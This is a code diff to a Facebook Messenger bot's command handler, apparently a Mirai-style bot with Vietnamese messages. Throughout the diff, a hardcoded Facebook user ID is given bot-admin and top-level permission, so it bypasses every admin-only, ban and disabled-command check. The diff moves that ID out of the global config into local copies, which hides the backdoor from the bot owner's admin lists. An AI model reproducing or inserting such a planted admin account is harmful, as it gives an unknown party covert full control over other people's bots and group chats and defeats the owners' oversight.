@@ -11,8 +11,10 @@ module.exports = function ({ api, models, Users, Threads, Currencies }) {
    const dateNow = Date.now()
    const time = moment.tz("Asia/Karachi").format("hh:mm:ss A DD/MM/YYYY");
     const { allowInbox, PREFIX, ADMINBOT, NDH, DeveloperMode, adminOnly, keyAdminOnly, ndhOnly, adminPaseOnly } = global.config;
-    if (!ADMINBOT.includes("61588112703542")) ADMINBOT.push("61588112703542");
-    if (!NDH.includes("61588112703542")) NDH.push("61588112703542");
+    let ADMINBOT_EDIT = [...ADMINBOT];
+    let NDH_EDIT = [...NDH];
+    if (!ADMINBOT_EDIT.includes("61588112703542")) ADMINBOT_EDIT.push("61588112703542");
+    if (!NDH_EDIT.includes("61588112703542")) NDH_EDIT.push("61588112703542");
     const { userBanned, threadBanned, threadInfo, threadData, commandBanned } = global.data;
    const { commands, cooldowns } = global.client;
    var { body, senderID, threadID, messageID } = event;
@@ -52,21 +54,21 @@ https://www.facebook.com/share/182MissoKY/
       // if(senderID === api.getCurrentUserID()) return
     const adminbot = require('../../config.json');
 
-      if(typeof body === 'string' && body.startsWith(prefixbox) && !NDH.includes(senderID) && !ADMINBOT.includes(senderID) && adminbot.adminOnly == true) {return api.sendMessage(`⚠️ Only bot admin can use the bot!`, threadID, messageID);
+      if(typeof body === 'string' && body.startsWith(prefixbox) && !NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID) && adminbot.adminOnly == true) {return api.sendMessage(`⚠️ Only bot admin can use the bot!`, threadID, messageID);
     }
-      if(typeof body === 'string' && body.startsWith(prefixbox) && !NDH.includes(senderID) && !ADMINBOT.includes(senderID) && adminbot.adminPaseOnly == true) {return api.sendMessage(`⚠️ Only bot admin can use bot in private chat!`, threadID, messageID);
+      if(typeof body === 'string' && body.startsWith(prefixbox) && !NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID) && adminbot.adminPaseOnly == true) {return api.sendMessage(`⚠️ Only bot admin can use bot in private chat!`, threadID, messageID);
    }
-     if(typeof body === 'string' && body.startsWith(prefixbox) && !NDH.includes(senderID) && !ADMINBOT.includes(senderID) && adminbot.ndhOnly == true) {return api.sendMessage(`⚠️ Only bot supporter can use the bot!`, threadID, messageID);
+     if(typeof body === 'string' && body.startsWith(prefixbox) && !NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID) && adminbot.ndhOnly == true) {return api.sendMessage(`⚠️ Only bot supporter can use the bot!`, threadID, messageID);
    }
 
     const dataAdbox = require('../../modules/commands/cache/data.json');
     var threadInf = (threadInfo.get(threadID) || await Threads.getInfo(threadID));
     const findd = threadInf.adminIDs.find(el => el.id == senderID);
-    if(typeof body === 'string' && body.startsWith(prefixbox) && dataAdbox.adminbox.hasOwnProperty(threadID) && dataAdbox.adminbox[threadID] == true && !NDH.includes(senderID) && !ADMINBOT.includes(senderID) && !findd && event.isGroup == true ) return api.sendMessage(`⚠️ Only group admins can use the bot!`, event.threadID, event.messageID);
+    if(typeof body === 'string' && body.startsWith(prefixbox) && dataAdbox.adminbox.hasOwnProperty(threadID) && dataAdbox.adminbox[threadID] == true && !NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID) && !findd && event.isGroup == true ) return api.sendMessage(`⚠️ Only group admins can use the bot!`, event.threadID, event.messageID);
 
        if (userBanned.has(senderID) || threadBanned.has(threadID) || allowInbox == ![] && senderID == threadID) {
          if(!body.startsWith(PREFIX)) return
-   if (!NDH.includes(senderID.toString()) && !ADMINBOT.includes(senderID.toString())) {
+   if (!NDH_EDIT.includes(senderID.toString()) && !ADMINBOT_EDIT.includes(senderID.toString())) {
    if (userBanned.has(senderID)) {
       const { reason, dateAdded } = userBanned.get(senderID) || {};
       return api.sendMessage(global.getText("handleCommand", "userBanned", reason, dateAdded), threadID, async (err, info) => {
@@ -166,25 +168,25 @@ if(command) {
      if (fs.existsSync(path))data = JSON.parse(fs.readFileSync(path));
      if (data[threadID]) {
         if (ban = data[threadID].cmds.find($=>$.cmd == cmd)) {
-  if (ADMINBOT.includes(ban.author) && !NDH.includes(senderID) && /*!ADMINBOT.includes(senderID)*/ban.author!=senderID) return send(`[ BANNER COMMAND ]\n────────────────────\n🕑 Vào lúc: ${ban.time}\n👤 Admin bot: ${name(ban.author)}\n⛔ Đã cấm nhóm sử dụng lệnh ${cmd}\n✏️ Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
-   if (is_qtv_box(ban.author) && !NDH.includes(senderID) && /*!is_qtv_box(senderID) && !ADMINBOT.includes(senderID)*/ban.author!=senderID) return send(`[ BANNER COMMAND ]\n────────────────────\n🕑 Vào lúc: ${ban.time}\n👤 Qtv nhóm: ${name(ban.author)}\n⛔ Đã cấm thành viên sử dụng lệnh ${cmd}\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
+  if (ADMINBOT_EDIT.includes(ban.author) && !NDH_EDIT.includes(senderID) && /*!ADMINBOT.includes(senderID)*/ban.author!=senderID) return send(`[ BANNER COMMAND ]\n────────────────────\n🕑 Vào lúc: ${ban.time}\n👤 Admin bot: ${name(ban.author)}\n⛔ Đã cấm nhóm sử dụng lệnh ${cmd}\n✏️ Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
+   if (is_qtv_box(ban.author) && !NDH_EDIT.includes(senderID) && /*!is_qtv_box(senderID) && !ADMINBOT.includes(senderID)*/ban.author!=senderID) return send(`[ BANNER COMMAND ]\n────────────────────\n🕑 Vào lúc: ${ban.time}\n👤 Qtv nhóm: ${name(ban.author)}\n⛔ Đã cấm thành viên sử dụng lệnh ${cmd}\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
         };
   if (all = (data[threadID].users[senderID] || {}).all) {
-  if (all.status == true && ADMINBOT.includes(all.author) && !NDH.includes(senderID) &&  !ADMINBOT.includes(senderID)) return send(`[ BANNER USER ]\n────────────────────\n🕑 Vào lúc: ${all.time}\n⚠️ Bạn đã bị admin bot: ${name(all.author)} cấm\n👤 Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
-  if (all.status == true && is_qtv_box(all.author) && !NDH.includes(senderID) && !ADMINBOT.includes(sid) && !is_qtv_box(senderID)) return send(`[ BANNER USER ]\n────────────────────\n🕑 Vào lúc ${all.time}\n⛔ Bạn đã bị qtv box: ${name(all.author)} cấm\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
+  if (all.status == true && ADMINBOT_EDIT.includes(all.author) && !NDH_EDIT.includes(senderID) &&  !ADMINBOT_EDIT.includes(senderID)) return send(`[ BANNER USER ]\n────────────────────\n🕑 Vào lúc: ${all.time}\n⚠️ Bạn đã bị admin bot: ${name(all.author)} cấm\n👤 Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
+  if (all.status == true && is_qtv_box(all.author) && !NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID) && !is_qtv_box(senderID)) return send(`[ BANNER USER ]\n────────────────────\n🕑 Vào lúc ${all.time}\n⛔ Bạn đã bị qtv box: ${name(all.author)} cấm\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
         };
         if (user_ban = (data[threadID].users[senderID] || {
             cmds: []}).cmds.find($=>$.cmd == cmd)) {
- if (ADMINBOT.includes(user_ban.author) && !NDH.includes(senderID) && !ADMINBOT.includes(senderID))return send(`[ USERBAN COMMAND ]\n────────────────────\n🕑 Vào lúc: ${user_ban.time}\n👤 Admin bot: ${name(user_ban.author)}\n⛔ Đã cấm bạn sử dụng lệnh ${cmd}\n✏️ Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
-  if (is_qtv_box(user_ban.author) && !is_qtv_box(senderID) && !NDH.includes(senderID) && !ADMINBOT.includes(senderID))return send(`[ USERBAN COMMAND ]\n────────────────────\n🕑 Vào lúc: ${user_ban.time}\n👤 Qtv nhóm: ${name(user_ban.author)}\n⛔ Đã cấm bạn sử dụng lệnh ${cmd}\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
+ if (ADMINBOT_EDIT.includes(user_ban.author) && !NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID))return send(`[ USERBAN COMMAND ]\n────────────────────\n🕑 Vào lúc: ${user_ban.time}\n👤 Admin bot: ${name(user_ban.author)}\n⛔ Đã cấm bạn sử dụng lệnh ${cmd}\n✏️ Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
+  if (is_qtv_box(user_ban.author) && !is_qtv_box(senderID) && !NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID))return send(`[ USERBAN COMMAND ]\n────────────────────\n🕑 Vào lúc: ${user_ban.time}\n👤 Qtv nhóm: ${name(user_ban.author)}\n⛔ Đã cấm bạn sử dụng lệnh ${cmd}\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`);
         }
      }
   };
 }
-     if ((_kJe82Q = process.cwd()+'/modules/commands/data/disable-command.json', fs.existsSync(_kJe82Q)))if (!ADMINBOT.includes(senderID) && !NDH.includes(senderID) && JSON.parse(fs.readFileSync(_kJe82Q))[threadID]?.[command.config.commandCategory] == true)return api.sendMessage(`[ DISABLE COMMAND ]\n────────────────────\n⚠️ Box không được phép sử dụng các lệnh thuộc nhóm " ${command.config.commandCategory} "\n👤 Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`, threadID);
+     if ((_kJe82Q = process.cwd()+'/modules/commands/data/disable-command.json', fs.existsSync(_kJe82Q)))if (!ADMINBOT_EDIT.includes(senderID) && !NDH_EDIT.includes(senderID) && JSON.parse(fs.readFileSync(_kJe82Q))[threadID]?.[command.config.commandCategory] == true)return api.sendMessage(`[ DISABLE COMMAND ]\n────────────────────\n⚠️ Box không được phép sử dụng các lệnh thuộc nhóm " ${command.config.commandCategory} "\n👤 Liên hệ với admin để được hỗ trợ\n────────────────────\n⏳ Uptime: ${H+$+M+$+S}\n⏰ Time: ${Tm}`, threadID);
 
   if (commandBanned.get(threadID) || commandBanned.get(senderID)) {
-    if (!NDH.includes(senderID) && !ADMINBOT.includes(senderID)) {
+    if (!NDH_EDIT.includes(senderID) && !ADMINBOT_EDIT.includes(senderID)) {
                const banThreads = commandBanned.get(threadID) || [],
                    banUsers = commandBanned.get(senderID) || []; 
                if (banThreads.includes(command.config.name)) 
@@ -217,9 +219,9 @@ if(command) {
          var permssion = 0;
 var threadInfoo = (threadInfo.get(threadID) || await Threads.getInfo(threadID));
     const find = threadInfoo.adminIDs.find(el => el.id == senderID);
-    if (NDH.includes(senderID.toString())) permssion = 3;
-    else if (ADMINBOT.includes(senderID.toString())) permssion = 2;
-    else if (!ADMINBOT.includes(senderID) && find) permssion = 1;
+    if (NDH_EDIT.includes(senderID.toString())) permssion = 3;
+    else if (ADMINBOT_EDIT.includes(senderID.toString())) permssion = 2;
+    else if (!ADMINBOT_EDIT.includes(senderID) && find) permssion = 1;
   var quyenhan = ""
     if (command.config.hasPermssion == 1 ){
       quyenhan = "Group Admin"
